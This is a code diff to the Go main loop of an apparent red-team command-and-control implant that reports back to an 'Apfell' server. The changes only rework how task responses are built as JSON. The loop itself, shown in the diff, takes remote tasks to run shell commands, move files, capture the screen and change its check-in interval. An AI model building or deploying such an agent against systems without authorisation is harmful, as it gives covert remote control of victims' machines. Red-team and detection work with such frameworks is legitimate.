@@ -54,7 +54,6 @@ func RunMain() {
 func main() {
 
 	// Initialize the  agent and check in
-
 	currentUser, _ := user.Current()
 	hostname, _ := os.Hostname()
 	currIP := functions.GetCurrentIPAddress()
@@ -134,6 +133,7 @@ func main() {
 	res := make(chan structs.ThreadMsg)
 	//if we have an Active apfell session, enter the tasking loop
 	if strings.Contains(checkIn.Status, "success") {
+
 	LOOP:
 		for {
 			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)
@@ -162,9 +162,17 @@ func main() {
 				switch tasktypes[task.Tasks[0].Command] {
 				case EXIT_CODE:
 					// Throw away the response, we don't really need it for anything
-					// TODO: Change this
-					out := `{"user_output":"exiting"}`
-					profile.PostResponse(task.Tasks[0], string(out))
+					resp := structs.Response{}
+					resp.UserOutput = "exiting"
+					resp.Completed = true
+					resp.TaskID = task.Tasks[0].TaskID
+					encResp, err := json.Marshal(resp)
+					if err != nil {
+						log.Println("Error marshaling exit response: ", err.Error())
+						break
+					}
+
+					profile.PostResponse(task.Tasks[0], string(encResp))
 					break LOOP
 				case 1:
 					// Run shell command
@@ -179,7 +187,7 @@ func main() {
 					break
 				case 4:
 					//File download
-					// TODO: Update for v1.4
+
 					profile.SendFile(task.Tasks[0], task.Tasks[0].Params)
 					break
 				case 5:
@@ -193,14 +201,23 @@ func main() {
 					}
 
 					result := profile.GetFile(fileDetails)
-					out := `{}`
+					out := ""
 					if result {
-						out = `{"user_output":"file upload successful"}`
+						out = "upload successful"
 					} else {
-						out = `{"user_output":"file upload failed"}`
+						out = "upload failed"
 					}
 
-					profile.PostResponse(task.Tasks[0], string(out))
+					resp := structs.Response{}
+					resp.UserOutput = out
+					resp.Completed = true
+					resp.TaskID = task.Tasks[0].TaskID
+					encResp, err := json.Marshal(resp)
+					if err != nil {
+						log.Println("Error marshaling upload response: ", err.Error())
+						break
+					}
+					profile.PostResponse(task.Tasks[0], string(encResp))
 					break
 
 				case 6:
@@ -218,9 +235,16 @@ func main() {
 					}
 
 					profile.SetSleepInterval(i)
-					// TODO: Change this
-					out := `{"user_output":"sleep updated"}`
-					profile.PostResponse(task.Tasks[0], string(out))
+					resp := structs.Response{}
+					resp.UserOutput = "sleep updated"
+					resp.Completed = true
+					resp.TaskID = task.Tasks[0].TaskID
+					encResp, err := json.Marshal(resp)
+					if err != nil {
+						log.Println("Error marshaling sleep response: ", err.Error())
+						break
+					}
+					profile.PostResponse(task.Tasks[0], string(encResp))
 
 					break
 				case 10:
@@ -231,21 +255,20 @@ func main() {
 					//Change cwd
 					err := os.Chdir(task.Tasks[0].Params)
 					if err != nil {
-						out := map[string]interface{}{
-							"user_output": err.Error(),
-						}
-						encOut, _ := json.Marshal(out)
-						profile.PostResponse(task.Tasks[0], string(encOut))
+						profile.PostResponse(task.Tasks[0], err.Error())
 
 						break
 					}
-
-					// TODO: Change this
-					out := map[string]interface{}{
-						"user_output": fmt.Sprintf("changed directory to: %s", task.Tasks[0].Params),
+					resp := structs.Response{}
+					resp.UserOutput = fmt.Sprintf("changed directory to: %s", task.Tasks[0].Params)
+					resp.Completed = true
+					resp.TaskID = task.Tasks[0].TaskID
+					encResp, err := json.Marshal(resp)
+					if err != nil {
+						log.Println("Error marshaling cd response: ", err.Error())
+						break
 					}
-					encOut, _ := json.Marshal(out)
-					profile.PostResponse(task.Tasks[0], string(encOut))
+					profile.PostResponse(task.Tasks[0], string(encResp))
 					break
 				case 12:
 					//List directory contents
@@ -380,11 +403,16 @@ func main() {
 				if strings.Contains(toApfell.TaskItem.Command, "screencapture") {
 					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
 				} else {
-					out := map[string]interface{}{
-						"user_output": string(toApfell.TaskResult),
+					resp := structs.Response{}
+					resp.Completed = true
+					resp.TaskID = toApfell.TaskItem.TaskID
+					resp.UserOutput = string(toApfell.TaskResult)
+					encResp, err := json.Marshal(resp)
+					if err != nil {
+						log.Println("Error marshaling task response: ", err.Error())
+						break
 					}
-					encOut, _ := json.Marshal(out)
-					profile.PostResponse(toApfell.TaskItem, string(encOut))
+					profile.PostResponse(toApfell.TaskItem, string(encResp))
 				}
 			case <-time.After(1 * time.Second):
 				break
